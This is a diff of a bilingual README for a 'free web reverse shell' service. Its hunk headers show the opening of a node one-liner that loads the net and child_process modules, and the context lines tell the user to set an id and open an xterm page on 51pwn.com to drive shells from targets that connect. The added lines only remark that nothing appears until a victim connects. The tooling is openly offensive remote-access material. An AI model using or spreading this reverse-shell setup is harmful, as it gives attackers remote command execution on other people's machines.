@@ -18,6 +18,8 @@ node -e '(function(){ var net = require("net"), cp = require("child_process"), s
 * open your browser
   *** 注意后面的id必须和上面的一致
 https://51pwn.com/indexes/xterm.html?id=xxxx_001
+ ** 注意，这个时候你什么也没有看见，没错，因为还没有目标连接上来 **
+
 """
 # Free web reverse shell
 * 1 setYourId: xxxx_001
@@ -39,6 +41,7 @@ node -e '(function(){ var net = require("net"), cp = require("child_process"), s
 * open your browser
    *** Note that the following id must be consistent with the above
 https://51pwn.com/indexes/xterm.html?id=xxxx_001
+** Note that you don’t see anything at this time, that’s right, because there is no target connected yet **
 """
 
 
